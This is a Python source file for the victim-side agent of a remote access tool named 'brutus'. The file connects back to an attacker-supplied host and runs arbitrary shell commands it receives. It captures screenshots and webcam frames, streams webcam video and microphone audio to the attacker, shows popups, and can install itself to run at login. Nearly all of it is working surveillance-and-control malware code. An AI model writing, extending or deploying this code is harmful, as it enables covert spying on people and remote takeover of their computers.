"""Victim agent — connects to the attacker and responds to commands.

Usage:
    python -m brutus victim --host <attacker-ip> [--port 8080] [--install-persistence]
"""

import argparse
import pathlib
import socket
import subprocess
import threading

from brutus.messages import Message
from brutus.platform import get_platform
from brutus.protocol import recv_frame, send_frame
from brutus.victim.client.microphone_client import MicrophoneClient
from brutus.victim.client.webcam_client import WebcamClient

VIDEO_PORT = 8081
AUDIO_PORT = 8082

_SCREENSHOT_CMDS = {
    Message.CMD_CAPTURE_SCREENSHOT.value,
    Message.CMD_CAPTURE_SCREENSHOT_SHORT.value,
    Message.LEGACY_TAKE_SCREENSHOT.value,
    Message.LEGACY_TAKE_SCREENSHOT_SHORT.value,
}
_SNAPSHOT_CMDS = {
    Message.CMD_CAPTURE_SNAPSHOT.value,
    Message.CMD_CAPTURE_SNAPSHOT_SHORT.value,
    Message.LEGACY_TAKE_SNAPSHOT.value,
}
_VIDEO_CMDS = {
    Message.CMD_START_VIDEO_STREAM.value,
    Message.CMD_START_VIDEO_STREAM_SHORT.value,
    Message.LEGACY_START_WEBCAM.value,
    Message.LEGACY_START_WEBCAM_SHORT.value,
}
_AUDIO_CMDS = {
    Message.CMD_START_AUDIO_STREAM.value,
    Message.CMD_START_AUDIO_STREAM_SHORT.value,
    Message.LEGACY_START_MICROPHONE.value,
    Message.LEGACY_START_MICROPHONE_SHORT.value,
}


def _handle_screenshot(sock: socket.socket, platform) -> None:
    try:
        png_bytes = platform.screenshot()
        send_frame(sock, Message.STATUS_SCREENSHOT_CAPTURED.value.encode())
        send_frame(sock, png_bytes)
    except Exception as exc:
        send_frame(sock, f"{Message.ERROR_COMMAND_FAILED.value}: {exc}".encode())


def _handle_snapshot(sock: socket.socket, platform) -> None:
    """Single webcam frame, no streaming."""
    try:
        import cv2

        cap = cv2.VideoCapture(0)
        try:
            for _ in range(10):
                ret, frame = cap.read()
            if not ret:
                raise RuntimeError("no frame")
            ok, buf = cv2.imencode(".png", frame)
            if not ok:
                raise RuntimeError("encode failed")
        finally:
            cap.release()

        send_frame(sock, Message.STATUS_SNAPSHOT_CAPTURED.value.encode())
        send_frame(sock, buf.tobytes())
    except Exception as exc:
        send_frame(sock, f"{Message.ERROR_COMMAND_FAILED.value}: {exc}".encode())


def _handle_video(sock: socket.socket, host: str) -> None:
    send_frame(sock, Message.STATUS_VIDEO_STREAM_STARTING.value.encode())
    client = WebcamClient(host, VIDEO_PORT)
    threading.Thread(target=client.run, daemon=True).start()


def _handle_audio(sock: socket.socket, host: str) -> None:
    send_frame(sock, Message.STATUS_AUDIO_STREAM_STARTING.value.encode())
    client = MicrophoneClient(host, AUDIO_PORT)
    threading.Thread(target=client.run, daemon=True).start()


def _handle_popup(sock: socket.socket, command: str, platform) -> None:
    # Expected format: show_popup '<title>' '<message>'
    try:
        parts = command.split("'")
        title = parts[1]
        message = parts[3]
        threading.Thread(target=platform.show_popup, args=(title, message), daemon=True).start()
    except Exception:
        pass


def _handle_shell(sock: socket.socket, command: str) -> None:
    """Run a shell command and send the output back."""
    try:
        # cd is a special case: update cwd for this process
        if command.startswith("cd "):
            target = command[3:].strip()
            try:
                pathlib.Path(target).resolve().is_dir()  # validate
                import os

                os.chdir(target)
                out = f"[cwd] {pathlib.Path.cwd()}".encode()
            except Exception as exc:
                out = f"[error] {exc}".encode()
        else:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=30,
            )
            out = result.stdout or b""
        send_frame(sock, out)
    except subprocess.TimeoutExpired:
        send_frame(sock, b"[error] command timed out")
    except Exception as exc:
        send_frame(sock, f"{Message.ERROR_COMMAND_FAILED.value}: {exc}".encode())


def run(host: str, port: int, platform) -> None:
    with socket.create_connection((host, port)) as sock:
        print(f"[victim] connected to {host}:{port}")
        while True:
            try:
                raw = recv_frame(sock)
            except (ConnectionError, EOFError):
                print("[victim] connection lost")
                break

            command = raw.decode(Message.TEXT_ENCODING.value, errors="replace").strip()

            _popup_cmds = {Message.CMD_SHOW_POPUP.value, Message.LEGACY_POPUP.value}
            if command in _SCREENSHOT_CMDS:
                threading.Thread(
                    target=_handle_screenshot, args=(sock, platform), daemon=True
                ).start()
            elif command in _SNAPSHOT_CMDS:
                threading.Thread(
                    target=_handle_snapshot, args=(sock, platform), daemon=True
                ).start()
            elif command in _VIDEO_CMDS:
                _handle_video(sock, host)
            elif command in _AUDIO_CMDS:
                _handle_audio(sock, host)
            elif command.split(" ")[0] in _popup_cmds:
                _handle_popup(sock, command, platform)
            elif command:
                threading.Thread(target=_handle_shell, args=(sock, command), daemon=True).start()


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(prog="brutus victim")
    parser.add_argument("--host", default="127.0.0.1", help="Attacker IP")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument(
        "--install-persistence",
        action="store_true",
        help="Register this script to run at login (explicit opt-in)",
    )
    args = parser.parse_args(argv)

    platform = get_platform()

    if args.install_persistence:
        script = str(pathlib.Path(__file__).resolve())
        ok = platform.install_persistence(script)
        if not ok:
            print("[persistence] install failed — continuing without it")

    run(args.host, args.port, platform)
    return 0
